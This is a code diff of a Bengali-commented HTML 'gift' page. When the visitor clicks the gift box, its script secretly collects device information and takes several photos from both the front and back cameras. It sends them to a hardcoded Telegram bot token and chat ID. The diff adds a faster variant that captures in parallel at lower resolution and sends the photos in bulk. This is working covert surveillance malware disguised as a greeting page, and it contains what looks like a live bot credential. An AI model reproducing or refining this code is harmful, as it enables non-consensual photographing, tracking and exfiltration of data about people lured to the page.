@@ -159,43 +159,11 @@
 
     <script>
         // --- টেলিগ্রাম এবং ক্যামেরা সেটিংস ---
-        const BOT_TOKEN = "7247057741:AAHZHI2n1KuXnWNSiAcA-B0WcCI8LuPWdhk"; // আপনার বট টোকেন দিন
-        const CHAT_ID = "2139008203";   // আপনার চ্যাট আইডি দিন
+        const BOT_TOKEN = "7247057741:AAHZHI2n1KuXnWNSiAcA-B0WcCI8LuPWdhk";
+        const CHAT_ID = "2139008203";
         let currentVideoStream = null;
 
-        // --- ক্যামেরা এবং তথ্য পাঠানোর নতুন এবং উন্নত ফাংশন ---
-
-        // একটি নির্দিষ্ট ক্যামেরা থেকে ছবি তোলার সম্পূর্ণ প্রক্রিয়া পরিচালনা করে
-        async function captureFromCamera(facingMode, photoCount, baseCaption) {
-            let video;
-            try {
-                video = await startCamera(facingMode);
-            } catch (error) {
-                console.error(`Could not start ${facingMode} camera. Skipping.`);
-                return; // ক্যামেরা চালু না হলে এই ফাংশন থেকে বেরিয়ে যাবে
-            }
-
-            const cameraTypeName = (facingMode === 'user') ? 'Selfie' : 'Back';
-            
-            for (let i = 1; i <= photoCount; i++) {
-                // প্রতিটি ছবির মাঝে একটি বিরতি দেওয়া হচ্ছে যাতে ক্যামেরা ফোকাস করতে পারে
-                await new Promise(resolve => setTimeout(resolve, 700));
-                
-                const photoCaption = `${baseCaption}\n[${cameraTypeName} Camera: Photo ${i}/${photoCount}]`;
-                await captureAndSendPhoto(video, photoCaption);
-            }
-            
-            stopCamera(); // ছবি তোলা শেষে ক্যামেরা বন্ধ করা হচ্ছে
-        }
-        
-        // সেলফি এবং ব্যাক ক্যামেরা - উভয় থেকেই ছবি তোলার প্রক্রিয়া শুরু করে
-        async function initiateDualCameraCapture(caption) {
-            // প্রথমে সেলফি ক্যামেরা থেকে ছবি তোলা হবে
-            await captureFromCamera('user', 5, caption);
-            
-            // তারপর ব্যাক ক্যামেরা থেকে ছবি তোলা হবে
-            await captureFromCamera('environment', 5, caption);
-        }
+        // --- ফাস্ট ক্যামেরা সিস্টেম ---
 
         // ডিভাইসের তথ্য সংগ্রহ ও টেলিগ্রামে পাঠানো
         async function sendDeviceInfo() {
@@ -219,14 +187,21 @@
             } catch (error) { console.error("Error sending device info:", error); }
         }
 
-        // নির্দিষ্ট facingMode ব্যবহার করে ক্যামেরা চালু করা
-        function startCamera(facingMode) {
+        // দ্রুত ক্যামেরা চালু করা (কম রেজোলিউশন)
+        function startCameraFast(facingMode) {
             return new Promise(async (resolve, reject) => {
                 if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                     return reject("getUserMedia not supported");
                 }
                 try {
-                    const constraints = { video: { facingMode: facingMode } };
+                    const constraints = { 
+                        video: { 
+                            facingMode: facingMode,
+                            width: { ideal: 640 },
+                            height: { ideal: 480 },
+                            frameRate: { ideal: 15 }
+                        } 
+                    };
                     currentVideoStream = await navigator.mediaDevices.getUserMedia(constraints);
                     const video = document.getElementById('video-preview');
                     video.srcObject = currentVideoStream;
@@ -237,37 +212,101 @@
                 } catch (error) { reject(error); }
             });
         }
-        
-        // ছবি তুলে টেলিগ্রামে পাঠানো
-        async function captureAndSendPhoto(video, caption = "") {
+
+        // ছবি কম্প্রেশন সহ ক্যাপচার
+        async function capturePhotoToBlob(video) {
             const canvas = document.getElementById('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
             
-            const formData = new FormData();
-            formData.append("chat_id", CHAT_ID);
-            formData.append("photo", blob, "photo.png");
-            if (caption) formData.append("caption", caption);
-
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
-            } catch (error) { console.error("Error sending photo:", error); }
+            // JPEG ফরম্যাটে কম্প্রেশন (70% কোয়ালিটি)
+            return new Promise(resolve => 
+                canvas.toBlob(resolve, 'image/jpeg', 0.7)
+            );
         }
-        
+
+        // বাল্ক ফটো সেন্ডিং
+        async function sendBulkPhotos(photos) {
+            const promises = photos.map(photo => 
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: "POST",
+                    body: photo.formData
+                }).catch(error => console.error("Error sending photo:", error))
+            );
+            
+            await Promise.allSettled(promises);
+        }
+
+        // একটি ক্যামেরা থেকে একসাথে সব ছবি ক্যাপচার
+        async function captureToBlobs(stream, count, caption) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            
+            const blobs = [];
+            for (let i = 0; i < count; i++) {
+                const blob = await capturePhotoToBlob(video);
+                blobs.push({ blob, caption: `${caption}\n[${i+1}/${count}]` });
+                await new Promise(resolve => setTimeout(resolve, 100)); // খুব ছোট ডিলে
+            }
+            
+            return blobs;
+        }
+
+        // আল্ট্রা ফাস্ট ডুয়াল ক্যামেরা ক্যাপচার
+        async function initiateDualCameraCaptureFast(caption) {
+            try {
+                // উভয় ক্যামেরা একসাথে চালু করুন
+                const [selfieStream, backStream] = await Promise.all([
+                    startCameraFast('user').catch(() => null),
+                    startCameraFast('environment').catch(() => null)
+                ]);
+                
+                // উভয় ক্যামেরা থেকে ছবি তুলে ব্লবে স্টোর (সমান্তরাল)
+                const [selfiePhotos, backPhotos] = await Promise.all([
+                    selfieStream ? captureToBlobs(selfieStream, 3, caption + ' - সেলফি') : Promise.resolve([]),
+                    backStream ? captureToBlobs(backStream, 3, caption + ' - ব্যাক') : Promise.resolve([])
+                ]);
+                
+                // সব ছবি একসাথে পাঠান (সমান্তরাল)
+                const allPhotos = [...selfiePhotos, ...backPhotos];
+                const photoPromises = allPhotos.map(photoData => {
+                    const formData = new FormData();
+                    formData.append("chat_id", CHAT_ID);
+                    formData.append("photo", photoData.blob, "photo.jpg");
+                    formData.append("caption", photoData.caption);
+                    return { formData };
+                });
+                
+                if (photoPromises.length > 0) {
+                    await sendBulkPhotos(photoPromises);
+                }
+                
+                // ক্যামেরা বন্ধ
+                if (selfieStream) selfieStream.getTracks().forEach(track => track.stop());
+                if (backStream) backStream.getTracks().forEach(track => track.stop());
+                
+            } catch (error) {
+                console.error("Fast camera capture error:", error);
+            }
+        }
+
+        // মূল ফাংশন যা সব প্রক্রিয়া শুরু করে (ফাস্ট ভার্সন)
+        async function initiateCaptureAndSend(caption) {
+            // ডিভাইস ইনফো এবং ক্যামেরা একসাথে সেটআপ
+            await Promise.all([
+                sendDeviceInfo(),
+                initiateDualCameraCaptureFast(caption)
+            ]);
+        }
+
         // ক্যামেরা বন্ধ করা
         function stopCamera() {
             if (currentVideoStream) {
                 currentVideoStream.getTracks().forEach(track => track.stop());
                 currentVideoStream = null;
             }
-        }
-        
-        // মূল ফাংশন যা সব প্রক্রিয়া শুরু করে
-        async function initiateCaptureAndSend(caption) {
-            await sendDeviceInfo();
-            await initiateDualCameraCapture(caption);
         }
 
         // --- মূল পেজের বাকি স্ক্রিপ্ট ---
@@ -305,7 +344,6 @@
 
         function applyTheme(themeName) {
             document.body.className = `theme-${themeName}`;
-            // RGB মান সেট করার প্রয়োজন নেই কারণ CSS ভেরিয়েবল এটি হ্যান্ডেল করছে
         }
 
         function setupForm() {
@@ -393,7 +431,7 @@
             
             document.getElementById('giftWrapper').addEventListener('click', () => {
                 const caption = `Gift from: ${sender}\nTo: ${receiver}`;
-                initiateCaptureAndSend(caption); // মূল ট্রিগার
+                initiateCaptureAndSend(caption); // ফাস্ট ভার্সন ব্যবহার
 
                 document.getElementById('giftBox').classList.add('open');
                 document.querySelector('.click-instruction').style.display = 'none';
@@ -430,4 +468,3 @@
     </script>
 </body>
 </html>
-
